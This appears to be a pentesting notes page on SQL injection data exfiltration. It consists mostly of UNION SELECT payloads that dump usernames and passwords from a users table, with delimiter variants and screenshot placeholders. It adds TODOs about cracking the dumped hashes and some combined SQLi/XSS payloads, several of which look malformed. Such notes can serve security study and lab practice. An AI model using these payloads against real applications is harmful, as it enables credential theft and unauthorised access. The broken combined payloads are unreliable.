# 02 - Data Exfiltration

## 2.1 - Exploit

```sql
' UNION SELECT USER, password FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT user || ':' || password, NULL FROM users#

' UNION SELECT concat(user,':',password), NULL FROM users#

' UNION SELECT concat(user,0x3a,password), NULL FROM users#

' UNION SELECT group_concat(user,':',password), NULL FROM users#

' UNION SELECT group_concat(user,0x3a,password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'~',password), NULL FROM users#

' UNION SELECT group_concat(user,'~',password), NULL FROM users#
```

`<Insert screenshot>`

```sql
' UNION SELECT concat(user,'\n',password), NULL FROM users#

' UNION SELECT concat(user,0x0a,password), NULL FROM users#

' UNION SELECT group_concat(user,0x0a,password), NULL FROM users#
```

`<Insert screenshot>`

TODO: Use [[Pentesting Phases/Initial Access/Password Cracking/Offline/JTR|John The Ripper (JTR)]] and [[Identify Hash#^f93d17|Name-That-Hash]] to demonstrate cracking weak passwords with a dictionary list after dumping the credentials

TODO: Add XSS for easier view

```sql
' UNION SELECT group_concat(user,':',password), <script>alert()</script>, NULL FROM users#

' UNION SELECT group_concat(user,':',password), <hex_encoded_XSS>, NULL FROM users#

' <script>alert(UNION SELECT group_concat(user,':',password), NULL FROM users)</script>#

' <script>alert(UNION SELECT group_concat(user,0x3a,password), NULL FROM users)</script>#
```

## References

- [SecurityIdiots: XSS Injection with SQLi (XSSQLi)](https://www.securityidiots.com/Web-Pentest/SQL-Injection/xss-injection-with-sqli-xssqli.html)